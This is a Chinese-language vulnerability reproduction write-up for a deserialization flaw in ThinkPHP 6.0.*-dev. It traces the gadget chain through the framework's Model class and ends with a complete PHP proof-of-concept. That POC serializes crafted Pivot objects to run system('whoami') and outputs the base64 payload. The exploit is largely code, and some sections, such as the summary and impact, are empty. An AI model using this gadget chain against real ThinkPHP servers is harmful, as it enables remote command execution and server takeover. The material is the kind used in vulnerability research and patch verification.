Thinkphp 6.0.\*-dev 反序列化漏洞
================================

一、漏洞简介
------------

所有Thinkphp版本下载链接

<https://packagist.org/packages/topthink/framework>

二、漏洞影响
------------

三、复现过程
------------

### 环境搭建

    composer create-project topthink/think=6.0.*-dev v6.0

### poc演示截图

![](./resource/Thinkphp6.0.*-dev反序列化漏洞/media/rId27.png)

### 调用链

![](./resource/Thinkphp6.0.*-dev反序列化漏洞/media/rId29.png)

### 单步调试

    //vendor\topthink\think-orm\src\Model.php
    public function __destruct()
    {
        if ($this->lazySave) {  //$this->lazySave可控
            $this->save();
        }
    }
    //vendor\topthink\think-orm\src\Model.php
    public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);

        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
           return false;
        }

        $result = $this->exists ? $this->updateData() : $this->insertData($sequence); //this->exists可控

        if (false === $result) {
           return false;
        }
    //vendor\topthink\think-orm\src\Model.php
    public function isEmpty(): bool
    {
        return empty($this->data);    //可控
    }
    protected function trigger(string $event): bool
    {
        if (!$this->withEvent) {       //可控
            return true;
        }
        ...
    }
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {   //可控
           return false;
        }

        $this->checkData();

        // 获取有更新的数据
        $data = $this->getChangedData();  

        if (empty($data)) {         //$data可控
           // 关联更新
           if (!empty($this->relationWrite)) {
             $this->autoRelationUpdate();
           }

           return true;
        }

        if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) {
           // 自动写入更新时间
           $data[$this->updateTime]       = $this->autoWriteTimestamp($this->updateTime);
           $this->data[$this->updateTime] = $data[$this->updateTime];
        }

        // 检查允许字段
        $allowFields = $this->checkAllowFields();
    public function getChangedData(): array
    {
        $data = $this->force ? $this->data : array_udiff_assoc($this->data, $this->origin, function ($a, $b) {
           if ((empty($a) || empty($b)) && $a !== $b) {
             return 1;
           }
        //$this->force可控
           return is_object($a) || $a != $b ? 1 : 0;
        });

        // 只读字段不允许更新
        foreach ($this->readonly as $key => $field) {
           if (isset($data[$field])) {
             unset($data[$field]);
           }
        }

        return $data;
    }
    protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {   //$this->field可控
           if (!empty($this->schema)) {  //$this->schema可控
             $this->field = array_keys(array_merge($this->schema, $this->jsonType));
           } else {
             $query = $this->db();
             $table = $this->table ? $this->table . $this->suffix : $query->getTable();
    public function db($scope = []): Query
    {
        /** @var Query $query */
        $query = self::$db->connect($this->connection)   //$this->connection可控
           ->name($this->name . $this->suffix)   //$this->suffix可控，采用拼接，调用_toString
           ->pk($this->pk);

后面的链跟之前的一样，这里就不分析了

![](./resource/Thinkphp6.0.*-dev反序列化漏洞/media/rId31.png)

### poc v6.0.\*-dev

    <?php
    /**
     * Created by PhpStorm.
     * User: wh1t3P1g
     */

    namespace think\model\concern {
        trait Conversion{
            protected $visible;
        }
        trait RelationShip{
            private $relation;
        }
        trait Attribute{
            private $withAttr;
            private $data;
            protected $type;
        }
        trait ModelEvent{
            protected $withEvent;
        }
    }

    namespace think {
        abstract class Model{
            use model\concern\RelationShip;
            use model\concern\Conversion;
            use model\concern\Attribute;
            use model\concern\ModelEvent;
            private $lazySave;
            private $exists;
            private $force;
            protected $connection;
            protected $suffix;
            function __construct($obj)
            {
                if($obj == null){
                    $this->data = array("wh1t3p1g"=>"whoami");
                    $this->relation = array("wh1t3p1g"=>[]);
                    $this->visible= array("wh1t3p1g"=>[]);
                    $this->withAttr = array("wh1t3p1g"=>"system");
                }else{
                    $this->lazySave = true;
                    $this->withEvent = false;
                    $this->exists = true;
                    $this->force = true;
                    $this->data = array("wh1t3p1g"=>[]);
                    $this->connection = "mysql";
                    $this->suffix = $obj;
                }
            }
        }
    }


    namespace think\model {
        class Pivot extends \think\Model{
            function __construct($obj)
            {
                parent::__construct($obj);
            }
        }
    }


    namespace {
        $pivot1 = new \think\model\Pivot(null);
        $pivot2 = new \think\model\Pivot($pivot1);
        echo base64_encode(serialize($pivot2));
